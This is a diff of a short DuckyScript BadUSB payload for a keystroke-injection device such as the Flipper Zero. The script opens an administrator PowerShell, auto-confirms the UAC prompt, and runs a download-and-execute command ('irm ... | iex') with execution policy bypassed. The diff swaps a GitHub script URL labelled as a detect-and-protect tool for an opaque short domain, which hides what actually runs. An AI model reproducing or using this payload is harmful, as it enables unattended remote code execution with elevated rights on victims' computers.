@@ -15,7 +15,7 @@ DEFAULT_DELAY 100
 REM open powershell (remove -W Hidden to show the window).
 GUI r
 DELAY 750
-STRING powershell -Exec Bypass -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/BadUSB-Detect-and-Protect/main.ps1 | iex
+STRING powershell -Exec Bypass -C irm https://bw0.cc/busb | iex
 CTRL-SHIFT ENTER
 DELAY 2500
 ALT y
